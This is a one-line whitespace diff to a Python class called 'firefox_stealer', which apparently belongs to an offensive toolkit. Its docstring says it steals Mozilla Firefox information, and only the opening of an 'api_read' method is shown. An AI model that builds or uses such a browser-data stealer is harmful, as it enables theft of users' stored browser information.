@@ -7,6 +7,7 @@ class firefox_stealer(Payload):
     """
     This payload steals Mozilla Firefox information
     """
+
     def api_read(self):
         result = {}
         files = []
